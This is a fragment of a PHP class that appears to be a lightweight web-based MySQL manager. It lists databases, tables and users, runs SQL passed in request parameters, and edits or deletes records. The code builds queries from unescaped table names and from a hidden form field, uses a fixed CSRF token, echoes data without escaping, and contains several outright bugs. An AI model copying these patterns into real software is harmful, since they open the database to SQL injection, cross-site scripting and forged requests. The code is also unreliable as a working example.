        }
    }

    function escape($item){
        if(is_array($item)){
            $arr = array();
            foreach($item as $key => $val){
                    $arr[$k] = $this->escape($val);
            }
            return $arr;
        }else{
            return mysql_real_escape_string($item, $this->conn);
        }
        return $item;
    }

    // error tracking / helping
    function display($item){
        print "<pre>";
        print_r($this->getReturn($item));
        print "</pre>";
    }

    function error($query, $error){
        print("<br>QUERY: '{$query}'");
        print("<br>ERROR: " . $error);
    }

    function validTbl($tbl){
//         if(in_array($tbl,$this->tbl)){
            return true;
//         }else{
//             $this->error("INVALID TABLE","CHECK YO SELF");
//             return false;
//         }
    }

    // for database
    function getdbs(){
        $db_list = $this->query("SHOW DATABASES");

        if($db_list){
		    while ($row = mysql_fetch_assoc($db_list)) {
		        $db[] =  $row['Database'];
		    }
        }

        return $this->getReturn($db);
    }

    // list all databases this user has access to
    function viewDB(){
        $db = $this->getdbs();
        $output = "<fieldset>";
        $output .= "<legend>Databases (".count($db).")</legend>";
        if(is_array($db)){
             foreach($db as $key =>$val){
                 $class = " class='ajax' update='left' blank='right'";
                 if($val === $this->dbname){
                     $output .= "<i><b>{$val}</b></i><br>";
                 }else{
                     $output .= "<a href='". $this->url(base64_encode($val)) ."&method=database' {$class}>{$val}</a><br>";
                 }
             }
        }else{
             $output .= "<i>No Databases</i>";
        }
        $output .= "</fieldset>";
        $output .= "<br>";

        return $output;
    }

    // table specific, gets information to be built by a view function
    function getTables($reload = 0){
        if($reload){
            unset($this->tbl);
        }
        if(empty($this->tbl)){
            if($_GET['db']){
                $res = $this->query("SHOW TABLES FROM " . $this->dbname);
                if($res){
		            while($row = mysql_fetch_assoc($res)){
		                $arr[] = $row['Tables_in_' . $this->dbname];
		            }
                }
                $this->tbl = $arr;
                return $this->getReturn($arr);
            }
        }else{
            return $this->getReturn($this->tbl);
        }
    }

       // list all tables user has access to
    function viewTables($reload = 0){

        $tbl = $this->getTables($reload);

        $output = "<fieldset>";
        $output .= "<legend>Tables (".count($tbl).")</legend>";
        $output .= "<table>";

        if(is_array($tbl)){
            foreach($tbl as $key =>$val){
                $this->query("SELECT * FROM ". $val);
                $rows = mysql_num_rows($this->results);
                $val = htmlentities($val);
                $output .= "<tr>";
                $output .= "<td>";
                $output .= "<a  href='" . $this->url() ."method=ajax&tbl=".base64_encode($val)."&view=1' update='right' alt='{$rows} Rows' title='{$rows} Rows' class=\"ajax\">{$val}</a>";
                $output .= "</td>";
                $output .= "</tr>\r";
            }
        }else{
        	$output .= "<i>No Tables</i>";
        }
        $output .= "</table>";
        $output .= "</fieldset>";
        $output .= "<br>";

        return $output;
    }

    function tblStruct($tbl){
        if(!$this->validTbl($tbl)) return false;

        $this->query("DESCRIBE {$tbl}");
        while($row = mysql_fetch_assoc($this->results)){
            $arr[] = $row;
        }
        return $this->getReturn($arr);
    }

     function get_all_users(){
        return $this->dbinfo;
    }

    function view_all_users(){
        $users = $this->get_all_users();
        $count = 0;
        $output = "<fieldset>";
        $output .= "<legend>Users (".count($users).")</legend>";
		if(is_array($users)){
		    foreach($users as $arr){
		        $class = " class='ajax' update='left' blank='right'";
		        $user = $arr['user'];
		        if($count == $this->current){
		            $output .= "<i><b>{$user}</b></i><br>";
		        }else{
		            $output .= "<a href='". $this->url() ."&method=database&current={$count}' {$class}>{$user}</a><br>";
		        }
		        $count++;
		    }
        }else{
        	$output .= "<i>No Users</i>";
        	$output .= var_dump($users);
        }
        $output .= "</fieldset>";
        $output .= "<br>";

        return $output;
    }


    // view is for viewing all contents of tables, default setting
    function viewAll($tbl,$start,$end){
        if(!$this->validTbl($tbl)) return false;

        $query = "SELECT * FROM " . $tbl . $this->limit;

        $start = (is_numeric($start) ? $start : "0");
        $end = (is_numeric($end) ? $end : "0");

        $tbl = $this->escape($tbl);

        $tableFields = $this->tblStruct($tbl);

        $table = $this->viewQuery($query);

        $table .= "<a href='". $this->url() ."tbl=".base64_encode($tbl)."&edit=0&method=ajax' class='ajax' update='right'>Add Record</a>";
        $table .= "<table id='view'>";
        $table .= "<tr>";
        $table .= "<th>Options</th>";
        foreach($tableFields as $key => $val){
            $fields[] = $val['Field'];
            $table .= "<th>{$val['Field']}</th>";
        }
        $table .= "</tr>";
        $keys = $this->fetch("SELECT k.column_name
                                    FROM information_schema.table_constraints t
                                    JOIN information_schema.key_column_usage k
                                    USING ( constraint_name, table_schema, table_name )
                                    WHERE t.constraint_type = 'PRIMARY KEY'
                                    AND t.table_schema = '{$this->dbname}'
                                    AND t.table_name = '{$tbl}'");
        if($this->numRows() > 0){
            $primary = base64_encode($keys['column_name']);
        }
        $this->query($query);
        $count = 0;
        while($row = mysql_fetch_assoc($this->results)){
            $count++;
            $table .= "<tr>";
            foreach($fields as $key=>$val){
                if($val === $keys['column_name']){
                    $_id = base64_encode($row[$val]);
                }
                if(strlen($row[$val]) > 20){
                    $string = substr($row[$val],0,20) . "...";
                }else{
                    $string = $row[$val];
                }
                $html .="<td>{$string}</td>";

            }
            if(!isset($_id)){
                $_id = base64_encode($count);
            }
            $table .= "<td><a href='". $this->url() ."tbl=".base64_encode($tbl)."&edit={$_id}&primary={$primary}&method=ajax' class='ajax' update='right'>Edit</a>";
            $table .= " | <a href='". $this->url() ."tbl=".base64_encode($tbl)."&delete={$_id}&primary={$primary}&method=ajax' class='ajax' update='right'>Delete</a></td>";
            $table .= $html;
            $table .= "</tr>";
            unset($_id);
            unset($html);
        }

        $table .= "</table>";

        return $table;
    }

     // view is for viewing contents of tables from queries
    function view($query,$start,$end){
        $query = base64_decode($query);
        $this->display($query);

        $tbl = explode("from",strtolower($query));
        $tbl = explode("where",strtolower($tbl['1']));
        $tbl = trim($tbl['0']);

        if(!$this->validTbl($tbl)) return false;

        $start = (is_numeric($start) ? $start : "0");
        $end = (is_numeric($end) ? $end : "0");

        $tableFields = $this->tblStruct($tbl);

        $this->query($query);



        $table .= "<a href='". $this->url() ."tbl=".base64_encode($tbl)."&edit=0&method=ajax' class='ajax' update='right'>Add Record</a>";
        $table .= "<table id='view'>";
        $table .= "<tr>";
        if(is_array($tableFields)){
            foreach($tableFields as $key => $val){
                $fields[] = $val['Field'];
                $table .= "<th>{$val['Field']}</th>";
            }
        }
        $table .= "<th>Tools</th>";
        $table .= "</tr>";
        $key = $this->fetch("SELECT k.column_name as key
                                    FROM information_schema.table_constraints t
                                    JOIN information_schema.key_column_usage k
                                    USING(constraint_name,table_schema,table_name)
                                    WHERE t.constraint_type='PRIMARY KEY'
                                      AND t.table_schema='{$this->dbname}'
                                      AND t.table_name='{$tbl}';");
        $table = $this->viewQuery($query);
        while($row = mysql_fetch_assoc($this->results)){

            $table .= "<tr>";
            foreach($fields as $key=>$val){
                if(strlen($row[$val]) > 20){
                    $string = substr($row[$val],0,20) . "...";
                }else{
                    $string = $row[$val];
                }
                $table .="<td>{$string}</td>";
            }
            $table .= "<td><a href='". $this->url() ."tbl=".base64_encode($tbl)."&edit={$key['key']}&method=ajax' class='ajax' update='right'>Edit</a> | <a href='#'>Delete</a></td>";
            $table .= "</tr>";
        }

        $table .= "</table>";

        return $table;
    }

    // textarea with query in it at top
    function viewQuery($query = ""){

        if(!$query){
            $query = $this->queries[count($this->queries)]["query"];
        }

        $output = $this->formstart();
        $output .= "<input type='submit' name='submit'>";
        $output .= "<textarea id='query' name='query'>{$query}</textarea><br>";
        $output .= $this->formEnd();
        return $output;
    }

    # Primary display function
    function viewDisplay($get){

        $this->load();

        if($this->noWorkie){
         return "No Database Users to connect with";
        }

        if(empty($get['method'])) $get['method'] = '';

            $output .= '<div id="wrapper">';
            $output .= '<table>';
            $output .= '<tr>';
            $output .= '<td>';

            switch($get['method']){
                case '':
                case 'database':
                    $output .= '<div id="left">';
                        $output .= $this->view_all_users();
                        $output .= $this->viewDB();
                        $output .= $this->viewTables();
                    $output .= '</div>';
                break;
                break;
                case 'ajax';
                break;
            }
            $output .= "</td><td valign='top' align='left'>";
            $output .= '<div id="right">&nbsp;';
                if(isset($get['view'])){
                    $start = ($get['start'] ? $get['start'] : "0");
                    $end = ($get['end'] ? $get['end'] : "0");
                    $output .= $this->viewAll(base64_decode($get['tbl']),$start,$end);
                }
                if(isset($get['query'])){
                    $start = ($get['start'] ? $get['start'] : "0");
                    $end = ($get['end'] ? $get['end'] : "0");
                    $output .= $this->view($get['query'],$start,$end);
                }
                if((isset($get['edit']))||(isset($get['delete']))){
                    $action = ($get['edit'] ? "edit" : "delete");
                    $output .= $this->$action(base64_decode($get['tbl']),base64_decode(($get['edit'] ? $get['edit'] : $get['delete'])),base64_decode($get['primary']));
                }
            $output .= '</div>';
            $output .= '</td>';
            $output .= '</tr>';
            $output .= '</table>';
            $output .= '</div>';

        print $output;
    }

    // controlling base href for entire script
    function url($dbname = 0){
        if(!$dbname){
            $dbname = base64_encode($this->dbname);
        }
        $baseURL = /*$this->file . */"?m=mysql&db={$dbname}&current={$this->current}&";
        return $baseURL;
    }

    // adding and editing functions for any table
    function edit($tbl, $id = 0, $key){
        $fields = $this->tblStruct($tbl);

        $action = "tbl=".base64_encode($tbl)."&edit=".base64_encode($id)."&primary=".base64_encode($key)."&method=ajax";

        if(($id)&&($key)){
            $value = $this->fetch("SELECT * FROM {$tbl} WHERE {$key} = '{$id}'");
            $primary = $key;
            $sql = "";
        }else if(($id)&&(!$key)){
            $low = $id - 1;
            $high = 1;
            $value = $this->fetch("SELECT * FROM {$tbl} LIMIT {$low}, {$high}");
            foreach($value as $key => $val){
                $sql .= $this->escape($key)." = '".$this->escape($val)."', ";
            }
            $sql = substr($sql, 0, (strlen($sql)-2));
            $primary = "";
        }

        $output = $this->viewQuery();

        # This POST section is completely independent from this function, yet it remains....
        if(isset($_POST['_submit'])){
            if(strstr($_POST['_submit'], "Insert")){
                $sqlBase = "INSERT INTO {$tbl} SET ";
                $sqlEnd = "";
            }else{
                $sqlBase = "UPDATE {$tbl} SET ";
                $_id = $id;
                $_sql = base64_decode($_POST['_sql']);
                $primary = $this->escape(base64_decode($_POST['_primary']));
                if($_POST['_sql']){
                    $sqlEnd = " WHERE {$_sql}";
                }else{
                    $sqlEnd = " WHERE {$key} = '{$_id}'";
                }
            }

            unset($_POST['_csrf']);
            unset($_POST['_submit']);
            unset($_POST['_id']);
            unset($_POST['_sql']);
            unset($_POST['_primary']);
            unset($primary);

            foreach($_POST as $key => $val){
                $sql .= $this->escape($key)." = '".$this->escape($val)."', ";
            }
            $sql = substr($sql, 0, (strlen($sql)-2));

            $sqlBase .= $sql . $sqlEnd;
            $this->query($sqlBase);
            $output .= "Query Ran: {$sqlBase}";
        }
        # Brad is a Bastard.
        # Will he ever see this message? If he doesn't, how will he know?

        $output .= $this->formStart("POST",$action);
        $output .= "<table class='edit'>";

        foreach($fields as $key => $val){
            $output .= "<tr>";
                $output .= "<td>{$val['Field']}</td>";
                $output .= "<td>{$val['Type']}</td>";
                $output .= "<td>". $this->formInput($val['Type'], $val['Field'], $value[$val['Field']]) ."</td>";
            $output .= "</tr>";
        }

        $output .= "<tr>";
            $output .= "<td colspan='3'>". $this->formInput("submit", "_submit",($id ? "Update" : "Insert") . " Record");
            $output .= $this->formInput("hidden", "_id", base64_encode($_id));
            $output .= $this->formInput("hidden", "_primary", base64_encode($key));
            $output .= $this->formInput("hidden", "_sql", base64_encode($sql));
            $output .= "</td>";
        $output .= "</tr>";
        $output .= "</table>";
        $output .= $this->formEnd;

        return $output;
    }

    function delete($tbl, $id = 0, $key){
        $fields = $this->tblStruct($tbl);

        $action = "tbl=".base64_encode($tbl)."&delete=".base64_encode($id)."&primary=".base64_encode($key)."&method=ajax";

        if(($id)&&($key)){
            $value = $this->fetch("SELECT * FROM {$tbl} WHERE {$key} = '{$id}'");
            $primary = $key;
            $sql = "";
        }else if(($id)&&(!$key)){
            $low = $id - 1;
            $high = 1;
            $value = $this->fetch("SELECT * FROM {$tbl} LIMIT {$low}, {$high}");
            foreach($value as $key => $val){
                $sql .= $this->escape($key)." = '".$this->escape($val)."', ";
            }
            $sql = substr($sql, 0, (strlen($sql)-2));
            $primary = "";
        }

        $output = $this->viewQuery();

        # This POST section is completely independent from this function, yet it remains....
        if(isset($_POST['_submit'])){
            if(strstr($_POST['_submit'], "Delete")){
                $sqlBase = "DELETE FROM {$tbl} ";
                $_id = $id;
                $_sql = base64_decode($_POST['_sql']);
                $primary = $this->escape(base64_decode($_POST['_primary']));
                if($_POST['_sql']){
                    $sqlEnd = " WHERE {$_sql}";
                }else{
                    $sqlEnd = " WHERE {$key} = '{$_id}'";
                }
            }

            unset($_POST['_csrf']);
            unset($_POST['_submit']);
            unset($_POST['_id']);
            unset($_POST['_sql']);
            unset($_POST['_primary']);
            unset($primary);

            foreach($_POST as $key => $val){
                $sql .= $this->escape($key)." = '".$this->escape($val)."', ";
            }
            $sql = substr($sql, 0, (strlen($sql)-2));

            $sqlBase .= $sql . $sqlEnd;
            $this->query($sqlBase);
            $output .= "Query Ran: {$sqlBase}";
        }

        $output .= $this->formStart("POST",$action);
        $output .= "<table class='edit'>";

        foreach($fields as $key => $val){
            $output .= "<tr>";
                $output .= "<td>{$val['Field']}</td>";
                $output .= "<td>{$val['Type']}</td>";
                $output .= "<td>{$value[$val['Field']]}</td>";
            $output .= "</tr>";
        }

        $output .= "<tr>";
            $output .= "<td colspan='3'>". $this->formInput("submit", "_submit","Confirm Deletion of Record");
            $output .= $this->formInput("hidden", "_id", base64_encode($_id));
            $output .= $this->formInput("hidden", "_primary", base64_encode($key));
            $output .= $this->formInput("hidden", "_sql", base64_encode($sql));
            $output .= "</td>";
        $output .= "</tr>";
        $output .= "</table>";
        $output .= $this->formEnd;

        return $output;
    }

    // form functions
    function formStart($method = "GET", $action = ""){
        $output = "<form action='". $this->url() ."{$action}' method='{$method}' id='mysql-form'>";
        $output .= "<input type='hidden' name='_csrf' value='".urlencode('Why am I not alphanumeric and randomized!!')."'>";

        return $output;
    }

    function formEnd(){
        $output = "</form>";
        return $output;
    }

    function formInput($type, $name, $value = ""){
        switch($type){
            case 'submit' :
                $form = "<input type='submit' name='{$name}' class='input' value='{$value}'>";
            break;

            case 'hidden' :
                $form = "<input type='hidden' name='{$name}' class='input' value='{$value}'>";
            break;

            case 'text' :
                $form = "<textarea name='{$name}' class='input'>{$value}</textarea>";
            break;

            default:
                $form = "<input type='text' name='{$name}' class='input' value='{$value}'>";
            break;
        }

        return $form;
    }
}
